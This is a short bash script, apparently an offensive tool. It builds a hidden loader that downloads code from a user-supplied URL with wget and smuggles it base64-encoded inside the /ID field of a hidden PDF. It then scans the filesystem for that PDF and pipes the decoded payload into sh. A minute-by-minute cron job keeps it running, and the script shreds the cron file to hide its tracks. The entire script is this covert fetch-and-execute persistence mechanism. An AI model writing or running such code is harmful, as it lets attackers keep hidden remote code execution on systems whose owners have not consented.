#!/bin/bash

#Input Shell Commands
echo "[+] Input URL for Shell Commands"
read shell

#Create Payload
payload=$(echo $shell | sed 's/.*\///g')
echo 'wget '$shell'; mv '$payload.1' '$payload' 2> /dev/null && convert xc:none -page Letter .mal.pdf && base64=$(cat '$payload' | base64) && sed -i "s/^\/ID \[<.*> <.*>\]/\/ID \[<$base64> <$base64>\]/g" .mal.pdf && export md5sum=$(md5sum .mal.pdf | sed "s/ .*//g") && for i in $(find / -type f -name "*.pdf" -printf "%T@ %p\n" 2>/dev/null | sort -k1 -n 2> /dev/null | sed "s/.*'\ '//g"); do if md5sum $i 2> /dev/null | awk "{print $1}" | grep -q $md5sum; then strings $i | grep "^/ID" | sed "s/.*<//g" | sed "s/..$//g" | base64 -d | sh; fi done' > .parser.sh && chmod +x .parser.sh

#Create Payload Cron Job
echo '* * * * * cd '$(pwd)' && ./.parser.sh' > .cron && crontab .cron && shred .cron; rm .cron
